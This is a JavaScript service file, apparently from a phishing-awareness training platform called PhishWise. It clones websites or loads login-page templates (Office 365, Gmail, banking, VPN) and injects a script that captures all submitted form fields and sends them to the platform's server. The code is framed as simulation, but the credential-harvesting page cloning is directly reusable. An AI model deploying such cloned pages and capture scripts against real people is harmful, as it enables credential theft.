const puppeteer = require('puppeteer');
const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');
const { URL } = require('url');

class ScrapingService {

  constructor() {
    this.baseCloneDir = path.join(process.cwd(), 'public', 'cloned-pages');
    this.baseUrl = process.env.BASE_URL || 'http://localhost:3000';
    // --- CORRECTION 1 : Chemin correct pour les templates statiques ---
    this.staticTemplatesDir = path.join(process.cwd(), 'public', 'static-cloned-templates');
    // -----------------------------------------------------------------
    this.ensureDirectoryExists();
  }

  /**
   * Assurer que le dossier de destination existe
   */
  async ensureDirectoryExists() {
    try {
      await fs.access(this.baseCloneDir);
    } catch {
      await fs.mkdir(this.baseCloneDir, { recursive: true });
    }
    // Assurer que le dossier des templates statiques existe aussi (optionnel, mais bonne pratique)
    try {
      await fs.access(this.staticTemplatesDir);
    } catch {
      await fs.mkdir(this.staticTemplatesDir, { recursive: true });
    }
  }

  /**
   * Cloner un site web complet ou utiliser un template statique
   */
  async cloneWebsite(url, campaignId) {
    let browser = null;

    try {
      // Valider l'URL
      const parsedUrl = new URL(url);
      if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
        throw new Error('Protocole non supporté. Utilisez HTTP ou HTTPS.');
      }

      // Créer un identifiant unique pour ce clonage
      const cloneId = crypto.randomBytes(8).toString('hex');
      const cloneDir = path.join(this.baseCloneDir, `campaign-${campaignId}-${cloneId}`);
      await fs.mkdir(cloneDir, { recursive: true });

      const clonedUrlPath = `cloned-pages/campaign-${campaignId}-${cloneId}/index.html`;
      const clonedUrl = `${this.baseUrl}/${clonedUrlPath}`;
      const previewUrl = clonedUrl; // Pour l'instant, previewUrl est la même que clonedUrl

      // --- Logique pour les templates statiques ---
      // CORRECTION 2 : Adapter getStaticTemplateName pour gérer le chemin complet du template
      const templateName = this.getStaticTemplateName(parsedUrl.pathname);
      if (templateName) {
        console.log(`✨ Utilisation du template statique: ${templateName}.html`);
        const staticTemplatePath = path.join(this.staticTemplatesDir, `${templateName}.html`);
        const destinationPath = path.join(cloneDir, 'index.html');

        try {
          let htmlContent = await fs.readFile(staticTemplatePath, 'utf8');
          // Modifier le HTML du template statique pour ajouter le tracking
          htmlContent = this.modifyHtml(htmlContent, new Map(), parsedUrl, campaignId);
          await fs.writeFile(destinationPath, htmlContent, 'utf8');

          console.log(`✅ Template statique copié et modifié avec succès.`);
          return {
            success: true,
            clonedUrl,
            previewUrl,
            filePath: `cloned-pages/campaign-${campaignId}-${cloneId}`,
            cloneId,
            originalUrl: url,
            resourcesCount: 0, // Pas de ressources externes à scraper pour les templates statiques
            message: 'Template statique préparé avec succès'
          };
        } catch (readError) {
          console.error(`❌ Erreur de lecture du template statique ${staticTemplatePath}:`, readError);
          return {
            success: false,
            message: `Template statique introuvable ou inaccessible: ${templateName}.html`,
            error: readError.message
          };
        }
      }
      // --- Fin logique templates statiques ---

      // Si ce n'est pas un template statique, procéder au scraping avec Puppeteer
      console.log(`🌐 Procédure de scraping Puppeteer pour l'URL: ${url}`);
      browser = await puppeteer.launch({
        headless: 'new',
        args: [
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-dev-shm-usage',
          '--disable-accelerated-2d-canvas',
          '--no-first-run',
          '--no-zygote',
          '--disable-gpu'
        ]
      });

      const page = await browser.newPage();

      // Configurer le User-Agent et les dimensions
      await page.setUserAgent(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
      );
      await page.setViewport({ width: 1920, height: 1080 });

      // Intercepter les requêtes pour télécharger les ressources
      const resources = new Map();

      await page.setRequestInterception(true);
      page.on('request', async (request) => {
        // Bloquer les requêtes pour les images de placeholder si elles ne sont pas nécessaires
        if (request.url().includes('via.placeholder.com')) {
          request.abort();
          return;
        }
        request.continue();
      });

      page.on('response', async (response) => {
        const responseUrl = response.url();
        const resourceType = response.request().resourceType();

        // Télécharger CSS, JS, images, fonts
        if (['stylesheet', 'script', 'image', 'font'].includes(resourceType)) {
          try {
            const buffer = await response.buffer();
            const resourcePath = this.getResourcePath(responseUrl, parsedUrl.origin);
            const fullResourcePath = path.join(cloneDir, resourcePath);

            // Créer les dossiers nécessaires
            await fs.mkdir(path.dirname(fullResourcePath), { recursive: true });
            await fs.writeFile(fullResourcePath, buffer);

            resources.set(responseUrl, resourcePath);
          } catch (error) {
            console.warn(`Impossible de télécharger la ressource: ${responseUrl}`, error.message);
          }
        }
      });

      // Naviguer vers la page
      await page.goto(url, {
        waitUntil: 'networkidle2',
        timeout: 30000
      });

      await this.sleep(2000); // Attendre 2 secondes

      // Obtenir le HTML de la page
      let html = await page.content();

      // Modifier le HTML pour pointer vers les ressources locales et ajouter le tracking
      html = this.modifyHtml(html, resources, parsedUrl, campaignId);

      // Sauvegarder le fichier HTML principal
      const indexPath = path.join(cloneDir, 'index.html');
      await fs.writeFile(indexPath, html, 'utf8');

      return {
        success: true,
        clonedUrl,
        previewUrl,
        filePath: `cloned-pages/campaign-${campaignId}-${cloneId}`,
        cloneId,
        originalUrl: url,
        resourcesCount: resources.size,
        message: 'Site cloné avec succès'
      };

    } catch (error) {
      console.error('Erreur lors du clonage:', error);

      return {
        success: false,
        message: 'Erreur lors du clonage du site',
        error: error.message
      };
    } finally {
      if (browser) {
        await browser.close();
      }
    }
  }

  /**
   * Fonction sleep personnalisée pour remplacer waitForTimeout
   */
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * Modifier le HTML pour intégrer le tracking et corriger les liens
   */
  modifyHtml(html, resources, originalUrl, campaignId) {
    // Remplacer les URLs des ressources par les versions locales
    for (const [originalResource, localPath] of resources) {
      const escapedOriginal = originalResource.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      html = html.replace(new RegExp(escapedOriginal, 'g'), localPath);
    }

    // Ajouter le script de tracking pour capturer les soumissions de formulaires
    const trackingScript = `
    <script>
      (function() {
        console.log('PhishWise tracking activé');

        // Intercepter tous les formulaires
        document.addEventListener('DOMContentLoaded', function() {
          const forms = document.querySelectorAll('form');

          forms.forEach(function(form) {
            form.addEventListener('submit', function(e) {
              e.preventDefault();

              // Collecter les données du formulaire
              const formData = new FormData(form);
              const data = {};

              for (let [key, value] of formData.entries()) {
                data[key] = value;
              }

              // Ajouter des métadonnées
              data._campaignId = '${campaignId}';
              data._timestamp = new Date().toISOString();
              data._userAgent = navigator.userAgent;
              data._ipAddress = window.phishwise_ip_address; // Sera défini par le backend si possible
              data._referrer = document.referrer;
              data._url = window.location.href;

              // Envoyer les données au serveur PhishWise
              fetch('${this.baseUrl}/api/phishing/capture', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
              }).then(function() {
                // Rediriger vers la page d'apprentissage
                window.location.href = '${this.baseUrl}/learning/${campaignId}';
              }).catch(function(error) {
                console.error('Erreur lors de l\\'envoi des données:', error);
                // Redirection de fallback
                setTimeout(function() {
                  window.location.href = '${this.baseUrl}/learning/${campaignId}';
                }, 1000);
              });
            });
          });

          // Tracker les clics sur les liens
          document.addEventListener('click', function(e) {
            if (e.target.tagName === 'A' || e.target.closest('a')) {
              const link = e.target.tagName === 'A' ? e.target : e.target.closest('a');

              // Empêcher la navigation par défaut pour les liens internes au domaine cloné
              // et pour les liens désactivés
              if (link.href.startsWith('${this.baseUrl}') || link.getAttribute('onclick')) {
                 e.preventDefault();
              }


              // Envoyer l'événement de clic
              fetch('${this.baseUrl}/api/phishing/track-click', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  campaignId: '${campaignId}',
                  clickedUrl: link.href,
                  timestamp: new Date().toISOString(),
                  userAgent: navigator.userAgent,
                  ipAddress: window.phishwise_ip_address // Sera défini par le backend si possible
                })
              }).catch(console.error);

              // Si le lien n'a pas été désactivé, laisser la navigation se produire après le tracking
              // (pour les liens externes qui ne sont pas le domaine original)
              if (!link.getAttribute('onclick') && !link.href.startsWith('${this.baseUrl}')) {
                 // Ne rien faire, laisser le comportement par défaut se produire
              }
            }
          });
        });
      })();
    </script>`;

    // Injecter le script avant la fermeture du body, ou à la fin si pas de body
    if (html.includes('</body>')) {
      html = html.replace('</body>', trackingScript + '\n</body>');
    } else {
      html += trackingScript;
    }

    // Remplacer les liens absolus vers le site original par des liens relatifs ou désactivés
    const domain = originalUrl.hostname;
    const protocolAndDomain = `${originalUrl.protocol}//${domain}`;

    // Désactiver les liens vers le domaine original
    // Utiliser une regex plus robuste pour les attributs href
    html = html.replace(
      new RegExp(`(href=["'])${protocolAndDomain}[^"']*["']`, 'gi'),
      '$1#"' // Remplace le lien par "#"
    );
    // Ajouter un onclick pour les liens désactivés si ce n'est pas déjà fait
    html = html.replace(
        new RegExp(`(href=["']#["'])(?!.*onclick)`, 'gi'),
        `$1 onclick="alert('Lien désactivé pour la simulation'); return false;"`
    );


    return html;
  }

  /**
   * Détermine si l'URL correspond à un template statique et retourne son nom
   */
  getStaticTemplateName(pathname) {
    // Exemple: si l'URL du template est "/static-cloned-templates/office365-login.html"
    // On veut extraire "office365-login"
    const parts = pathname.split('/');
    let filename = parts[parts.length - 1]; // Ex: "office365-login.html"

    // --- CORRECTION 2 : Supprimer l'extension .html pour la correspondance ---
    if (filename.endsWith('.html')) {
      filename = filename.slice(0, -5); // Supprime ".html"
    }
    // -----------------------------------------------------------------------

    if (filename && filename.length > 0) {
      // Liste des noms de templates statiques que vous avez créés
      const staticTemplateNames = [
        'office365-login',
        'gmail-login',
        'facebook-login',
        'linkedin-login',
        'banking-portal',
        'corporate-vpn'
      ];
      if (staticTemplateNames.includes(filename)) {
        return filename;
      }
    }
    return null;
  }

  /**
   * Générer le chemin local pour une ressource
   */
  getResourcePath(resourceUrl, baseOrigin) {
    try {
      const url = new URL(resourceUrl);
      const relativePath = url.pathname;

      // Nettoyer le chemin et créer une structure de dossiers logique
      let cleanPath = relativePath.replace(/^\/+/, '');

      // Si le chemin est vide, créer un nom basé sur l'URL
      if (!cleanPath || cleanPath === '/') {
        const hash = crypto.createHash('md5').update(resourceUrl).digest('hex').substring(0, 8);
        cleanPath = `resource_${hash}`;
      }

      // Ajouter une extension si manquante
      if (!path.extname(cleanPath)) {
        const contentType = this.guessContentType(resourceUrl);
        cleanPath += this.getExtensionFromContentType(contentType);
      }

      return `assets/${cleanPath}`;
    } catch (error) {
      // Fallback pour les URLs problématiques
      const hash = crypto.createHash('md5').update(resourceUrl).digest('hex').substring(0, 8);
      return `assets/resource_${hash}`;
    }
  }

  /**
   * Deviner le type de contenu basé sur l'URL
   */
  guessContentType(url) {
    const ext = path.extname(new URL(url).pathname).toLowerCase();
    const contentTypes = {
      '.css': 'text/css',
      '.js': 'application/javascript',
      '.png': 'image/png',
      '.jpg': 'image/jpeg',
      '.jpeg': 'image/jpeg',
      '.gif': 'image/gif',
      '.svg': 'image/svg+xml',
      '.woff': 'font/woff',
      '.woff2': 'font/woff2',
      '.ttf': 'font/ttf',
      '.otf': 'font/otf'
    };

    return contentTypes[ext] || 'application/octet-stream';
  }

  /**
   * Obtenir l'extension basée sur le type de contenu
   */
  getExtensionFromContentType(contentType) {
    const extensions = {
      'text/css': '.css',
      'application/javascript': '.js',
      'text/javascript': '.js',
      'image/png': '.png',
      'image/jpeg': '.jpg',
      'image/gif': '.gif',
      'image/svg+xml': '.svg',
      'font/woff': '.woff',
      'font/woff2': '.woff2',
      'font/ttf': '.ttf',
      'font/otf': '.otf'
    };

    return extensions[contentType] || '';
  }

  /**
   * Nettoyer les fichiers d'une campagne (appelé lors de la suppression)
   */
  async cleanupCampaignFiles(campaignId) {
    try {
      const files = await fs.readdir(this.baseCloneDir);
      const campaignFiles = files.filter(file => file.startsWith(`campaign-${campaignId}-`));

      for (const file of campaignFiles) {
        const filePath = path.join(this.baseCloneDir, file);
        // Utiliser fs.rm pour supprimer récursivement des répertoires
        await fs.rm(filePath, { recursive: true, force: true });
      }

      return { success: true, deletedFiles: campaignFiles.length };
    } catch (error) {
      console.error('Erreur lors du nettoyage:', error);
      return { success: false, error: error.message };
    }
  }
}

module.exports = new ScrapingService();
